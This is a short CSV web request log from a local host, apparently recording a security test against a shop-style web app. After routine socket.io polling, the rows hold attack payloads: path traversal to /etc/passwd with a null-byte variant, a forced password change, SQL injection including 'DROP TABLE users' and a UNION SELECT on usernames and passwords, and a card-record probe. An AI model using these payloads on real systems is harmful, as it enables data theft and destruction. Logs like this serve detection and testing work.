_id,signature,body_bytes,ip,request.method,request.path,request.protocol,request_body,status,timestamp
1e55b8907b9eda146575eb5b,bae2cd6c1898ec99,96,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGeoQ,HTTP/1.1,,200,2025-12-02T23:40:49+0530
9c0c63d5dd0b991b56bfbcdd,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGex7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,40,200,2025-12-02T23:40:49+0530
d8f734245f8d08d997336a9b,44b4e5901a7362ef,32,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGeyB&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:40:49+0530
a1fc182632091d36b82ae70d,0aa919e8a17501d9,45,127.0.0.1,GET,/socket.io/?EIO=4&transport=websocket&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,400,2025-12-02T23:40:50+0530
85dad2b61652f38264060f7d,616ade6340ef5d91,9015,127.0.0.1,GET,/assets/file:///etc/passwd,HTTP/1.1,,200,2025-12-02T23:40:57+0530
c4b05a582d127d1843f1ce47,55af35de850dcbd1,343,127.0.0.1,POST,/rest/user/change-password,HTTP/1.1,"{\x22current\x22: \x22oldpassword\x22, \x22new\x22: \x22hacked123\x22, \x22repeat\x22: \x22hacked123\x22}",500,2025-12-02T23:40:59+0530
3f6c4570851dd68aad87bd02,bbf0ebe25ab69b46,9015,127.0.0.1,PUT,/etc/passwd%2500.jpg,HTTP/1.1,{\x22name\x22: \x22hacked\x22},200,2025-12-02T23:41:00+0530
18655a183dddcd2055786c5a,eeaae0a7260adcd2,245,127.0.0.1,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,401,2025-12-02T23:41:01+0530
531e8946367c1b3d145c959c,f7ed366bd59709e3,31,127.0.0.1,GET,/api/Cards?UserId=32,HTTP/1.1,,401,2025-12-02T23:41:02+0530
d8a1882cef64e2bd9bf20251,0a03c19f3929936e,337,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22' UNION SELECT username, password FROM users--\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22' UNION SELECT username, password FROM users--\x22}",201,2025-12-02T23:41:03+0530
